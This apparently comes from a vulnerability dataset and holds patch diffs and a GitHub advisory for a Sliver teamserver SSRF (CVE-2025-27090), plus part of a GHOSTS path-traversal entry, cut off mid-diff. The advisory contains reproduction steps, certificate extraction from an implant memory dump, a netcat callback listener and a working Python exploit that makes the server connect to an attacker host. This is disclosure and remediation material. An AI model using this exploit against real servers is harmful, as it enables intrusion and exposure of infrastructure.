                "content": "Merge pull request #1889 from BishopFox/fix/GHSA-fh4v-v779-4g2w\n\nTrack tunnel creation for `rportfwd`\n\nFilename: server/core/rtunnels/rtunnels.go:\n```\n@@ -8,6 +8,7 @@\nimport (\n var (\n \tRtunnels map[uint64]*RTunnel = make(map[uint64]*RTunnel)\n \tmutex    sync.RWMutex\n+\tpending  sync.Map\n )\n \n // RTunnel - Duplex byte read/write\n\n@@ -95,6 +96,21 @@\nfunc RemoveRTunnel(ID uint64) {\n \tdelete(Rtunnels, ID)\n }\n \n+func AddPending(sessionID string, connStr string) {\n+\tpending.Store(sessionID, connStr)\n+}\n+\n+func DeletePending(sessionID string) {\n+\tpending.Delete(sessionID)\n+}\n+\n+func Check(sessionID string, connStr string) bool {\n+\tif val, ok := pending.Load(sessionID); ok {\n+\t\treturn val == connStr\n+\t}\n+\treturn false\n+}\n+\n // func removeAndCloseAllRTunnels() {\n // \tmutex.Lock()\n // \tdefer mutex.Unlock()\n```\n\nFilename: server/handlers/sessions.go:\n```\n@@ -226,9 +226,14 @@\nfunc createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte\n \treq := &sliverpb.TunnelData{}\n \tproto.Unmarshal(data, req)\n \n-\tvar defaultDialer = new(net.Dialer)\n-\n \tremoteAddress := fmt.Sprintf(\"%s:%d\", req.Rportfwd.Host, req.Rportfwd.Port)\n+\tif !rtunnels.Check(session.ID, remoteAddress) {\n+\t\tsessionHandlerLog.Errorf(\"Session %s attempted to create reverse tunnel to %s without being initiated by a client\", session.ID, remoteAddress)\n+\t\treturn nil\n+\t}\n+\tdefer rtunnels.DeletePending(session.ID)\n+\n+\tvar defaultDialer = new(net.Dialer)\n \n \tctx, cancelContext := context.WithCancel(context.Background())\n```\n\nFilename: server/rpc/rpc-rportfwd.go:\n```\n@@ -23,6 +23,7 @@\nimport (\n \n \t\"github.com/bishopfox/sliver/protobuf/commonpb\"\n \t\"github.com/bishopfox/sliver/protobuf/sliverpb\"\n+\t\"github.com/bishopfox/sliver/server/core/rtunnels\"\n )\n \n // GetRportFwdListeners - Get a list of all reverse port forwards listeners from an implant\n\n@@ -38,6 +39,7 @@\nfunc (rpc *Server) GetRportFwdListeners(ctx context.Context, req *sliverpb.Rport\n // StartRportfwdListener - Instruct the implant to start a reverse port forward\n func (rpc *Server) StartRportFwdListener(ctx context.Context, req *sliverpb.RportFwdStartListenerReq) (*sliverpb.RportFwdListener, error) {\n \tresp := &sliverpb.RportFwdListener{Response: &commonpb.Response{}}\n+\trtunnels.AddPending(req.Request.SessionID, req.ForwardAddress)\n \terr := rpc.GenericHandler(req, resp)\n \tif err != nil {\n \t\treturn nil, err\n```",
                "url": "https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f"
            },
            {
                "content": "Merge pull request #1890 from BishopFox/fix/v1.5.x/GHSA-fh4v-v779-4g2w\n\nTrack reverse portfwd state\n\nFilename: implant/sliver/sliver.c:\n```\n@@ -3,6 +3,8 @@\n#ifdef __WIN32\n #include <windows.h>\n \n+void StartW();\n+\n DWORD WINAPI Start()\n {\n     StartW();\n```\n\nFilename: server/core/rtunnels/rtunnels.go:\n```\n@@ -8,6 +8,7 @@\nimport (\n var (\n \tRtunnels map[uint64]*RTunnel = make(map[uint64]*RTunnel)\n \tmutex    sync.RWMutex\n+\tpending  sync.Map\n )\n \n // RTunnel - Duplex byte read/write\n\n@@ -95,6 +96,21 @@\nfunc RemoveRTunnel(ID uint64) {\n \tdelete(Rtunnels, ID)\n }\n \n+func AddPending(sessionID string, connStr string) {\n+\tpending.Store(sessionID, connStr)\n+}\n+\n+func DeletePending(sessionID string) {\n+\tpending.Delete(sessionID)\n+}\n+\n+func Check(sessionID string, connStr string) bool {\n+\tif val, ok := pending.Load(sessionID); ok {\n+\t\treturn val == connStr\n+\t}\n+\treturn false\n+}\n+\n // func removeAndCloseAllRTunnels() {\n // \tmutex.Lock()\n // \tdefer mutex.Unlock()\n```\n\nFilename: server/handlers/sessions.go:\n```\n@@ -226,9 +226,14 @@\nfunc createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte\n \treq := &sliverpb.TunnelData{}\n \tproto.Unmarshal(data, req)\n \n-\tvar defaultDialer = new(net.Dialer)\n-\n \tremoteAddress := fmt.Sprintf(\"%s:%d\", req.Rportfwd.Host, req.Rportfwd.Port)\n+\tif !rtunnels.Check(session.ID, remoteAddress) {\n+\t\tsessionHandlerLog.Errorf(\"Session %s attempted to create reverse tunnel to %s without being initiated by a client\", session.ID, remoteAddress)\n+\t\treturn nil\n+\t}\n+\tdefer rtunnels.DeletePending(session.ID)\n+\n+\tvar defaultDialer = new(net.Dialer)\n \n \tctx, cancelContext := context.WithCancel(context.Background())\n```\n\nFilename: server/rpc/rpc-rportfwd.go:\n```\n@@ -23,6 +23,7 @@\nimport (\n \n \t\"github.com/bishopfox/sliver/protobuf/commonpb\"\n \t\"github.com/bishopfox/sliver/protobuf/sliverpb\"\n+\t\"github.com/bishopfox/sliver/server/core/rtunnels\"\n )\n \n // GetRportFwdListeners - Get a list of all reverse port forwards listeners from an implant\n\n@@ -38,6 +39,7 @@\nfunc (rpc *Server) GetRportFwdListeners(ctx context.Context, req *sliverpb.Rport\n // StartRportfwdListener - Instruct the implant to start a reverse port forward\n func (rpc *Server) StartRportFwdListener(ctx context.Context, req *sliverpb.RportFwdStartListenerReq) (*sliverpb.RportFwdListener, error) {\n \tresp := &sliverpb.RportFwdListener{Response: &commonpb.Response{}}\n+\trtunnels.AddPending(req.Request.SessionID, req.ForwardAddress)\n \terr := rpc.GenericHandler(req, resp)\n \tif err != nil {\n \t\treturn nil, err\n```",
                "url": "https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1"
            }
        ],
        "published_date": "2025-02-19T21:11:06.671Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nBishopFox\n/\nsliver\nPublic\nNotifications You must be signed in to change notification settings\nFork 1.3k\nStar 9.3k\nCode\nIssues\n218\nPull requests\n19\nDiscussions\nActions\nProjects\nWiki\nSecurity\n3\nInsights\nAdditional navigation options\nSSRF in sliver teamserver v1.5.42/85b0e870d05ec47184958dbcb871ddee2eb9e3df\nModerate rkervella published GHSA-fh4v-v779-4g2w on Feb 19Feb 19, 2025\nPackage\nSliver server\nAffected versions\nv1.5.26 to v1.5.42\nv1.6.0 < 0f340a2\nPatched versions\nv1.5.43\nv1.6.0 (0f340a2)\nDescription\nSummary\nThe reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so\nReproduction steps\nRun server\nwget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux\nchmod +x sliver-server_linux\n./sliver-server_linux\nGenerate binary\ngenerate --mtls 127.0.0.1:8443\nRun it on windows, then Task manager -> find process -> Create memory dump file\nInstall RogueSliver and get the certs\ngit clone https://github.com/ACE-Responder/RogueSliver.git\npip3 install -r requirements.txt --break-system-packages\npython3 ExtractCerts.py implant.dmp\nStart callback listener. Teamserver will connect when POC is run and send \"ssrf poc\" to nc\nnc -nvlp 1111\nRun the poc (pasted at bottom of this file)\npython3 poc.py <SLIVER IP> <MTLS PORT> <CALLBACK IP> <CALLBACK PORT>\npython3 poc.py 192.168.1.33 8443 44.221.186.72 1111\nDetails\nWe see here an envelope is read from the connection and if the envelope.Type matches a handler the handler will be executed\nfunc handleSliverConnection(conn net.Conn) {\n mtlsLog.Infof(\"Accepted incoming connection: %s\", conn.RemoteAddr())\n implantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())\n\n defer func() {\n  mtlsLog.Debugf(\"mtls connection closing\")\n  conn.Close()\n  implantConn.Cleanup()\n }()\n\n done := make(chan bool)\n go func() {\n  defer func() {\n   done <- true\n  }()\n  handlers := serverHandlers.GetHandlers()\n  for {\n   envelope, err := socketReadEnvelope(conn)\n   if err != nil {\n    mtlsLog.Errorf(\"Socket read error %v\", err)\n    return\n   }\n   implantConn.UpdateLastMessage()\n   if envelope.ID != 0 {\n    implantConn.RespMutex.RLock()\n    if resp, ok := implantConn.Resp[envelope.ID]; ok {\n     resp <- envelope // Could deadlock, maybe want to investigate better solutions\n    }\n    implantConn.RespMutex.RUnlock()\n   } else if handler, ok := handlers[envelope.Type]; ok {\n    mtlsLog.Debugf(\"Received new mtls message type %d, data: %s\", envelope.Type, envelope.Data)\n    go func() {\n     respEnvelope := handler(implantConn, envelope.Data)\n     if respEnvelope != nil {\n      implantConn.Send <- respEnvelope\n     }\n    }()\n   }\n  }\n }()\n\nLoop:\n for {\n  select {\n  case envelope := <-implantConn.Send:\n   err := socketWriteEnvelope(conn, envelope)\n   if err != nil {\n    mtlsLog.Errorf(\"Socket write failed %v\", err)\n    break Loop\n   }\n  case <-done:\n   break Loop\n  }\n }\n mtlsLog.Debugf(\"Closing implant connection %s\", implantConn.ID)\n}\nThe available handlers:\nfunc GetHandlers() map[uint32]ServerHandler {\n return map[uint32]ServerHandler{\n  // Sessions\n  sliverpb.MsgRegister:    registerSessionHandler,\n  sliverpb.MsgTunnelData:  tunnelDataHandler,\n  sliverpb.MsgTunnelClose: tunnelCloseHandler,\n  sliverpb.MsgPing:        pingHandler,\n  sliverpb.MsgSocksData:   socksDataHandler,\n\n  // Beacons\n  sliverpb.MsgBeaconRegister: beaconRegisterHandler,\n  sliverpb.MsgBeaconTasks:    beaconTasksHandler,\n\n  // Pivots\n  sliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,\n  sliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,\n }\n}\nIf we send an envelope with the envelope.Type equaling MsgTunnelData, we will enter the tunnelDataHandler function\n// The handler mutex prevents a send on a closed channel, without it\n// two handlers calls may race when a tunnel is quickly created and closed.\nfunc tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {\n session := core.Sessions.FromImplantConnection(implantConn)\n if session == nil {\n  sessionHandlerLog.Warnf(\"Received tunnel data from unknown session: %v\", implantConn)\n  return nil\n }\n tunnelHandlerMutex.Lock()\n defer tunnelHandlerMutex.Unlock()\n tunnelData := &sliverpb.TunnelData{}\n proto.Unmarshal(data, tunnelData)\n\n sessionHandlerLog.Debugf(\"[DATA] Sequence on tunnel %d, %d, data: %s\", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)\n\n rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)\n if rtunnel != nil && session.ID == rtunnel.SessionID {\n  RTunnelDataHandler(tunnelData, rtunnel, implantConn)\n } else if rtunnel != nil && session.ID != rtunnel.SessionID {\n  sessionHandlerLog.Warnf(\"Warning: Session %s attempted to send data on reverse tunnel it did not own\", session.ID)\n } else if rtunnel == nil && tunnelData.CreateReverse == true {\n  createReverseTunnelHandler(implantConn, data)\n  //RTunnelDataHandler(tunnelData, rtunnel, implantConn)\n } else {\n  tunnel := core.Tunnels.Get(tunnelData.TunnelID)\n  if tunnel != nil {\n   if session.ID == tunnel.SessionID {\n    tunnel.SendDataFromImplant(tunnelData)\n   } else {\n    sessionHandlerLog.Warnf(\"Warning: Session %s attempted to send data on tunnel it did not own\", session.ID)\n   }\n  } else {\n   sessionHandlerLog.Warnf(\"Data sent on nil tunnel %d\", tunnelData.TunnelID)\n  }\n }\n\n return nil\n}\nThe createReverseTunnelHandler reads the envelope, creating a socket for req.Rportfwd.Host and req.Rportfwd.Port. It will write recv.Data to it\nfunc createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {\n session := core.Sessions.FromImplantConnection(implantConn)\n\n req := &sliverpb.TunnelData{}\n proto.Unmarshal(data, req)\n\n var defaultDialer = new(net.Dialer)\n\n remoteAddress := fmt.Sprintf(\"%s:%d\", req.Rportfwd.Host, req.Rportfwd.Port)\n\n ctx, cancelContext := context.WithCancel(context.Background())\n\n dst, err := defaultDialer.DialContext(ctx, \"tcp\", remoteAddress)\n //dst, err := net.Dial(\"tcp\", remoteAddress)\n if err != nil {\n  tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{\n   Closed:   true,\n   TunnelID: req.TunnelID,\n  })\n  implantConn.Send <- &sliverpb.Envelope{\n   Type: sliverpb.MsgTunnelClose,\n   Data: tunnelClose,\n  }\n  cancelContext()\n  return nil\n }\n\n if conn, ok := dst.(*net.TCPConn); ok {\n  // {{if .Config.Debug}}\n  //log.Printf(\"[portfwd] Configuring keep alive\")\n  // {{end}}\n  conn.SetKeepAlive(true)\n  // TODO: Make KeepAlive configurable\n  conn.SetKeepAlivePeriod(1000 * time.Second)\n }\n\n tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)\n rtunnels.AddRTunnel(tunnel)\n cleanup := func(reason error) {\n  // {{if .Config.Debug}}\n  sessionHandlerLog.Infof(\"[portfwd] Closing tunnel %d (%s)\", tunnel.ID, reason)\n  // {{end}}\n  tunnel := rtunnels.GetRTunnel(tunnel.ID)\n  rtunnels.RemoveRTunnel(tunnel.ID)\n  dst.Close()\n  cancelContext()\n }\n\n go func() {\n  tWriter := tunnelWriter{\n   tun:  tunnel,\n   conn: implantConn,\n  }\n  // portfwd only uses one reader, hence the tunnel.Readers[0]\n  n, err := io.Copy(tWriter, tunnel.Readers[0])\n  _ = n // avoid not used compiler error if debug mode is disabled\n  // {{if .Config.Debug}}\n  sessionHandlerLog.Infof(\"[tunnel] Tunnel done, wrote %v bytes\", n)\n  // {{end}}\n\n  cleanup(err)\n }()\n\n tunnelDataCache.Add(tunnel.ID, req.Sequence, req)\n\n // NOTE: The read/write semantics can be a little mind boggling, just remember we're reading\n // from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence\n // is used here whereas WriteSequence is used for data written back to the server\n\n // Go through cache and write all sequential data to the reader\n for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {\n  // {{if .Config.Debug}}\n  //sessionHandlerLog.Infof(\"[tunnel] Write %d bytes to tunnel %d (read seq: %d)\", len(recv.Data), recv.TunnelID, recv.Sequence)\n  // {{end}}\n  tunnel.Writer.Write(recv.Data)\n\n  // Delete the entry we just wrote from the cache\n  tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())\n  tunnel.IncReadSequence() // Increment sequence counter\n\n  // {{if .Config.Debug}}\n  //sessionHandlerLog.Infof(\"[message just received] %v\", tunnelData)\n  // {{end}}\n }\n\n //If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.\n //Send a Resend packet to have the msg resent from the cache\n if tunnelDataCache.Len(tunnel.ID) > 3 {\n  data, err := proto.Marshal(&sliverpb.TunnelData{\n   Sequence: tunnel.WriteSequence(), // The tunnel write sequence\n   Ack:      tunnel.ReadSequence(),\n   Resend:   true,\n   TunnelID: tunnel.ID,\n   Data:     []byte{},\n  })\n  if err != nil {\n   // {{if .Config.Debug}}\n   //sessionHandlerLog.Infof(\"[shell] Failed to marshal protobuf %s\", err)\n   // {{end}}\n  } else {\n   // {{if .Config.Debug}}\n   //sessionHandlerLog.Infof(\"[tunnel] Requesting resend of tunnelData seq: %d\", tunnel.ReadSequence())\n   // {{end}}\n   implantConn.RequestResend(data)\n  }\n }\n return nil\n}\nImpact\nFor current POC, mostly just leaking teamserver origin IP behind redirectors. I am 99% sure you can get full read SSRF but POC is blind only right now\nTo exploit this for MTLS listeners, you will need MTLS keys\nFor HTTP listeners, you will need to generate valid nonce\nNot sure about other transport types\nPOC\nPOC code, it is not cleaned up at all, please forgive me\n#!/usr/bin/python\nimport sys\nimport time\nimport base64\nimport socket, ssl\nfrom RogueSliver.consts import msgs\nimport random\nimport struct\nimport RogueSliver.sliver_pb2 as sliver\nimport json\nimport argparse\nimport uuid\nfrom google.protobuf import json_format\nfrom rich import print\nimport random\nimport string\n\nssl_ctx = ssl.create_default_context()\nssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')\nssl_ctx.load_verify_locations('certs/ca.crt')\nssl_ctx.check_hostname = False\nssl_ctx.verify_mode = ssl.CERT_NONE\n\n\n\ndef generate_random_string(length=8):\n    # Combine letters and digits\n    characters = string.ascii_letters + string.digits\n    # Generate random string\n    random_string = ''.join(random.choice(characters) for _ in range(length))\n    return random_string\n\ndef rand_unicode(junk_sz):\n  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()\n  return(junk)\n\ndef junk_register(junk_sz):\n  n = generate_random_string()\n  register = {\n        \"Name\": \"chebuya\"+n,\n        \"Hostname\": \"chebuya.local\"+n,\n        \"Uuid\": \"uuid\"+n,\n        \"Username\": \"username\"+n,\n        \"Uid\": \"uid\"+n,\n        \"Gid\": \"gid\"+n,\n        \"Os\": \"os\"+n,\n        \"Arch\": \"arch\"+n,\n        \"Pid\": 10,\n        \"Filename\": \"filename\"+n,\n        \"ActiveC2\": \"activec2\"+n,\n        \"Version\": \"version\"+n,\n        \"ReconnectInterval\": 60,\n        \"ConfigID\": \"config_id\"+n,\n        \"PeerID\": -1,\n        \"Locale\": \"locale\" + n\n  }\n\n  return register\n\n\n\ndef make_ping_env():\n  reg = sliver.Ping()\n  json_format.Parse(json.dumps({}),reg)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('Ping')\n  envelope.Data = reg.SerializeToString()\n\n  return envelope\n\n\n\ndef make_rt_env():\n    \n    jdata = {\n            \"Data\": \"c3NyZiBwb2M=\",\n            \"Closed\": False,\n            \"Sequence\": 0,\n            \"Ack\": 0,\n            \"Resend\": False,\n            \"CreateReverse\": True,\n            \"rportfwd\": {\n                \"Port\": int(sys.argv[4]),\n                \"Host\": sys.argv[3],\n                \"TunnelID\": 0,\n            },\n            \"TunnelID\": 0,\n    }\n\n\n\n    reg = sliver.TunnelData()\n    json_format.Parse(json.dumps(jdata),reg)\n    envelope = sliver.Envelope()\n    envelope.Type = msgs.index('TunnelData')\n    envelope.Data = reg.SerializeToString()\n\n    return envelope\n\n\n\n\ndef send_envelope(envelope,ip,port):\n  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    with ssl_ctx.wrap_socket(s,) as ssock:\n      ssock.connect((ip,port))\n\n      print(len(envelope.SerializeToString()))\n      #data_len = struct.pack('!I', len(envelope.SerializeToString()) )\n      data_len = struct.pack('I', len(envelope.SerializeToString()) )\n\n\n\n\n      envelope3 = make_rt_env()\n      data_len3 = struct.pack('I', len(envelope3.SerializeToString()) )\n\n      print(data_len)\n\n      ssock.write(data_len + envelope.SerializeToString()) \n      ssock.write(data_len3 + envelope3.SerializeToString())\n\n\n\n    \n      # No idea why this is reqauired\n      while True:\n          time.sleep(2)\n          ssock.write(data_len3 + envelope3.SerializeToString())\n\n\n\ndef register_session(ip,port):\n  print('[yellow]\\[i][/yellow] Sending session registration.')\n  reg = sliver.Register()\n  json_format.Parse(json.dumps(junk_register(50)),reg)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('Register')\n  envelope.Data = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndef register_beacon(ip,port):\n  print('[yellow]\\[i][/yellow] Sending beacon registration.')\n  reg = sliver.BeaconRegister()\n  reg.ID = str(uuid.uuid4())\n  junk_sz = 50\n  reg.Interval = random.randint(0,10*junk_sz)\n  reg.Jitter = random.randint(0,10*junk_sz)\n  reg.NextCheckin = random.randint(0,10*junk_sz)\n  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)\n  envelope = sliver.Envelope()\n  envelope.Type = msgs.index('BeaconRegister')\n  envelope.Data = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndescription = '''\nFlood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.\n'''\n\nif __name__ == '__main__':\n  register_session(sys.argv[1], int(sys.argv[2]))\nSeverity\nModerate\nCVE ID\nCVE-2025-27090\nWeaknesses\nNo CWEs\nCredits\nchebuya\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes explicit proof of concept code and detailed steps for reproducing the vulnerability.",
                "url": "https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w"
            }
        ],
        "sw_version": "v1.5.26",
        "sw_version_wget": "https://github.com/BishopFox/sliver/archive/refs/tags/v1.5.26.zip"
    },
    "CVE-2025-27092": {
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ],
        "description": "GHOSTS is an open source user simulation framework for cyber experimentation, simulation, training, and exercise. A path traversal vulnerability was discovered in GHOSTS version 8.0.0.0 that allows an attacker to access files outside of the intended directory through the photo retrieval endpoint. The vulnerability exists in the /api/npcs/{id}/photo endpoint, which is designed to serve profile photos for NPCs (Non-Player Characters) but fails to properly validate and sanitize file paths. When an NPC is created with a specially crafted photoLink value containing path traversal sequences (../, ..\\, etc.), the application processes these sequences without proper sanitization. This allows an attacker to traverse directory structures and access files outside of the intended photo directory, potentially exposing sensitive system files. The vulnerability is particularly severe because it allows reading arbitrary files from the server's filesystem with the permissions of the web application process, which could include configuration files, credentials, or other sensitive data. This issue has been addressed in version 8.2.7.90 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "languages": [
            "C#"
        ],
        "patch_commits": [
            {
                "content": "Mitigates directory traversal [XBOW-025-109]\n\nFilename: src/Ghosts.Api/Controllers/Api/NpcsController.cs:\n```\n@@ -16,10 +16,11 @@\nusing Ghosts.Animator.Extensions;\n using Ghosts.Animator.Models;\n using Ghosts.Api.Infrastructure.Data;\n-using Ghosts.Api.Infrastructure.Extensions;\n+using ghosts.api.Infrastructure.Extensions;\n using Ghosts.Domain.Code;\n using Microsoft.AspNetCore.Mvc;\n using Microsoft.EntityFrameworkCore;\n+using NLog;\n using Swashbuckle.AspNetCore.Annotations;\n using Swashbuckle.AspNetCore.Filters;\n\n@@ -30,8 +31,7 @@\nnamespace ghosts.api.Controllers.Api;\n [Route(\"api/[controller]\")]\n public class NpcsController(ApplicationDbContext context, INpcService service) : ControllerBase\n {\n-    private readonly ApplicationDbContext _context = context;\n-    private readonly INpcService _service = service;\n+    private static readonly Logger _log = LogManager.GetCurrentClassLogger();\n \n     /// <summary>\n     /// Returns all generated NPCs in the system (caution, could return a very large amount of data)\n\n@@ -43,7 +43,7 @@\npublic class NpcsController(ApplicationDbContext context, INpcService service) :\n     [HttpGet]\n     public async Task<ActionResult<IEnumerable<NpcRecord>>> NpcsGetAll()\n     {\n-        return Ok(await _service.GetAll());\n+        return Ok(await service.GetAll());\n     }\n \n     /// <summary>\n\n@@ -56,7 +56,7 @@\npublic async Task<ActionResult<IEnumerable<NpcRecord>>> NpcsGetAll()\n     [HttpPost]\n     public async Task<ActionResult<IEnumerable<NpcRecord>>> NpcsCreate(NpcProfile npc)\n     {\n-        return Ok(await _service.CreateOne(npc));\n+        return Ok(await service.CreateOne(npc));\n     }\n \n     /// <summary>\n\n@@ -69,7 +69,7 @@\npublic async Task<ActionResult<IEnumerable<NpcRecord>>> NpcsCreate(NpcProfile np\n     [HttpGet(\"list\")]\n     public async Task<ActionResult<IEnumerable<NpcNameId>>> NpcsGetList()\n     {\n-        return Ok(await _service.GetListAsync());\n+        return Ok(await service.GetListAsync());\n     }\n \n     /// <summary>\n\n@@ -83,7 +83,7 @@\npublic async Task<ActionResult<IEnumerable<NpcNameId>>> NpcsGetList()\n     [HttpGet(\"{id:guid}\")]\n     public async Task<ActionResult<NpcRecord>> NpcsGetById(Guid id)\n     {\n-        return Ok(await _service.GetById(id));\n+        return Ok(await service.GetById(id));\n     }\n \n     /// <summary>\n\n@@ -97,7 +97,7 @@\npublic async Task<ActionResult<NpcRecord>> NpcsGetById(Guid id)\n     [HttpDelete(\"{id:guid}\")]\n     public async Task NpcsDeleteById(Guid id)\n     {\n-        await _service.DeleteById(id);\n+        await service.DeleteById(id);\n     }\n \n     /// <summary>\n\n@@ -112,7 +112,7 @@\npublic async Task NpcsDeleteById(Guid id)\n     public async Task<IActionResult> NpcsGetAvatarById(Guid id)\n     {\n         // Get NPC and find image\n-        var npc = await _service.GetById(id);\n+        var npc = await service.GetById(id);\n         if (npc == null) return NotFound();\n \n         // Determine the image path\n\n@@ -123,11 +123,26 @@\npublic async Task<IActionResult> NpcsGetAvatarById(Guid id)\n         // Check if the image file exists\n         if (!System.IO.File.Exists(imagePath))\n         {\n+            _log.Warn($\"Npc {id} \u2014 File does not exist! {imagePath} \u2014 switching to default npc image\");\n+            imagePath = ApplicationDetails.ConfigurationFiles.DefaultNpcImage;\n+        }\n+\n+        // is path within the app? is it a jpg?\n+        if (!imagePath.IsPathWithinAppScope(ApplicationDetails.InstalledPath))\n+        {\n+            _log.Warn($\"Npc {id} \u2014 Bad image path! {imagePath} \u2014 switching to default npc image\");\n+            imagePath = ApplicationDetails.ConfigurationFiles.DefaultNpcImage;\n+        }\n+\n+        // is an image?\n+        if (!new HashSet<string> { \".jpg\", \".jpeg\", \".png\" }.Contains(Path.GetExtension(imagePath)?.ToLower()))\n+        {\n+            _log.Warn($\"Npc {id} \u2014 Not an image! {imagePath} \u2014 switching to default npc image\");\n             imagePath = ApplicationDetails.ConfigurationFiles.DefaultNpcImage;\n         }\n \n         // Load image as stream and return as file result\n-        var stream = new FileStream(imagePath, FileMode.Open, FileAccess.Read);\n+        var stream = new FileStream(imagePath!, FileMode.Open, FileAccess.Read);\n         return File(stream, \"image/jpg\", $\"{npc.NpcProfile.Name.ToString()!.Replace(\" \", \"_\")}.jpg\");\n     }\n\n@@ -147,7 +162,7 @@\npublic async Task<object> NpcsGetReducedFields(Guid npcId, [FromBody] string[] f\n             return BadRequest(ModelState);\n         }\n \n-        var npc = await _service.GetById(npcId);\n+        var npc = await service.GetById(npcId);\n         if (npc == null) return null;\n         return new NPCReduced(fieldsToReturn, npc).PropertySelection;\n     }\n\n@@ -164,7 +179,7 @@\npublic async Task<object> NpcsGetReducedFields(Guid npcId, [FromBody] string[] f\n     [HttpGet(\"{campaign}/{enclave}\")]\n     public async Task<IEnumerable<NpcRecord>> NpcsEnclaveGet(string campaign, string enclave)\n     {\n-        return await _service.GetEnclave(campaign, enclave);\n+        return await service.GetEnclave(campaign, enclave);\n     }\n \n     /// <summary>\n\n@@ -207,8 +222,8 @@\npublic async Task<IActionResult> NpcsEnclaveGetCsv(string campaign, string encla\n     public async Task NpcsEnclaveDelete(string campaign, string enclave)\n     {\n         var list = await NpcsEnclaveGet(campaign, enclave);\n-        _context.Npcs.RemoveRange(list);\n-        await _context.SaveChangesAsync();\n+        context.Npcs.RemoveRange(list);\n+        await context.SaveChangesAsync();\n     }\n \n     /// <summary>\n\n@@ -256,7 +271,7 @@\npublic async Task<IActionResult> NpcsEnclaveReducedFields(string campaign, strin\n     [HttpGet(\"{campaign}/{enclave}/{team}\")]\n     public async Task<IEnumerable<NpcRecord>> NpcsTeamGet(string campaign, string enclave, string team)\n     {\n-        return await _service.GetTeam(campaign, enclave, team);\n+        return await service.GetTeam(campaign, enclave, team);\n     }\n \n     /// <summary>\n\n@@ -311,7 +326,7 @@\npublic async Task<IActionResult> NpcsTfVarsGet(TfVarsConfiguration configuration\n \n         var pool = configuration.GetIpPool();\n         foreach (var item in pool)\n-            if (_context.NpcIps.Any(o => o.IpAddress == item && o.Enclave == configuration.Enclave))\n+            if (context.NpcIps.Any(o => o.IpAddress == item && o.Enclave == configuration.Enclave))\n                 pool.Remove(item);\n \n         if (pool.Count < list.Count())\n\n@@ -330,7 +345,7 @@\npublic async Task<IActionResult> NpcsTfVarsGet(TfVarsConfiguration configuration\n             }\n \n             var ip = pool.RandomElement();\n-            _context.NpcIps.Add(new NPCIpAddress { IpAddress = ip, NpcId = npc.Id, Enclave = npc.Enclave });\n+            context.NpcIps.Add(new NPCIpAddress { IpAddress = ip, NpcId = npc.Id, Enclave = npc.Enclave });\n             pool.Remove(ip);\n \n             s.Append(\"\\tuser-\").Append(i).Append(\" = {\").Append(Environment.NewLine);\n\n@@ -352,7 +367,7 @@\npublic async Task<IActionResult> NpcsTfVarsGet(TfVarsConfiguration configuration\n             i++;\n         }\n \n-        _context.SaveChanges();\n+        context.SaveChanges();\n \n         return File(Encoding.UTF8.GetBytes\n                 (s.ToString()), \"text/tfvars\", $\"{Guid.NewGuid()}.tfvars\");\n\n@@ -420,8 +435,8 @@\npublic async Task<ActionResult<IEnumerable<NpcRecord>>> NpcsInsiderThreatCreate(\n             }\n         }\n \n-        _context.Npcs.AddRange(createdNpcs);\n-        await _context.SaveChangesAsync(ct);\n+        context.Npcs.AddRange(createdNpcs);\n+        await context.SaveChangesAsync(ct);\n         return createdNpcs;\n     }\n\n@@ -439,7 +454,7 @@\npublic async Task<IActionResult> NpcsInsiderThreatGetCsv()\n         var engine = new FileHelperEngine<NPCToInsiderThreatCsv>();\n         engine.HeaderText = engine.GetFileHeader();\n \n-        var list = await _context.Npcs.ToListAsync();\n+        var list = await context.Npcs.ToListAsync();\n         var finalList = NPCToInsiderThreatCsv.ConvertToCsv(list.ToList());\n \n         var stream = new MemoryStream();\n```\n\nFilename: src/Ghosts.Api/Infrastructure/Extensions/DirectoryExtensions.cs:\n```\n@@ -0,0 +1,24 @@\n+// Copyright 2017 Carnegie Mellon University. All Rights Reserved. See LICENSE.md file for terms.\n+\n+using System;\n+using 